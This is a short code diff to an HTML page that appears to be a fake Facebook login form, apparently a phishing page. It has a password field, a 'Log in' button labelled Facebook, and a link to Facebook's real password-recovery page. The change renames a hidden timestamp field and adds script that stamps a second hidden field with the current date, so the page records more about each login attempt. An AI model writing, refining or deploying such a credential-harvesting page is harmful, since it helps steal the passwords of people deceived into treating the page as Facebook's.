@@ -395,7 +395,7 @@
             <input class="input o" name="Password"  id="password2" type="password" placeholder="Password"/>
 <button class="toggle2" type="button" id="toggle2">Show</button>
             <button type="submit" value="Facebook" name="commit" class="button">Log in</button>
-       <input type="hidden" name="Time" value="date" id="date"/>
+       <input type="hidden" name="Time_" value="date" id="date2"/>
             <a class="link" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
            <div class="line"></div>
            <button class="new">Create New Account</button>
@@ -460,7 +460,8 @@
       var date = new Date();
 	document.getElementById("date").value= date;
 	
-	
+	var date2 = new Date();
+	document.getElementById("date2").value= date2;
 	
 const togglePassword = document.querySelector("#toggle");
 const password = document.querySelector("#password");
